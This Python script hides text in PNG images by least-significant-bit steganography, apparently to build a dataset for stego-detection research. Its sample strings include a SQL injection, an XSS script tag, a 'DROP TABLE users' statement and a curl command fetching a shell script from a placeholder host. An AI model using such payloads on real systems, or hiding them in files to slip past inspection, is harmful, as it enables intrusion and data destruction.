from PIL import Image
import numpy as np
import os
import random


def text_to_bits(text):
    return "".join(format(ord(char), "08b") for char in text)


def embed_text_lsb(image_path, output_path, text):
    image = Image.open(image_path).convert("RGB")
    img_array = np.array(image)

    flat_pixels = img_array.reshape(-1, 3)

    text = text + "###END###"
    bits = text_to_bits(text)

    capacity = len(flat_pixels) * 3

    if len(bits) > capacity:
        raise ValueError("Payload is too large for this image.")

    bit_index = 0

    for i in range(len(flat_pixels)):
        for channel in range(3):
            if bit_index < len(bits):
                flat_pixels[i][channel] = (flat_pixels[i][channel] & 254) | int(bits[bit_index])
                bit_index += 1

    stego_array = flat_pixels.reshape(img_array.shape)
    stego_image = Image.fromarray(stego_array.astype(np.uint8))
    stego_image.save(output_path)


if __name__ == "__main__":
    os.makedirs("data/processed/stego", exist_ok=True)

    payloads = [
        "' OR '1'='1",
        "<script>alert('xss')</script>",
        "DROP TABLE users;",
        "curl http://example.com/shell.sh"
    ]

    selected_payload = random.choice(payloads)

    embed_text_lsb(
        image_path="data/raw_clean/sample.png",
        output_path="data/processed/stego/sample_stego.png",
        text=selected_payload
    )

    print("Embedded payload:", selected_payload)
    print("Stego image created successfully.")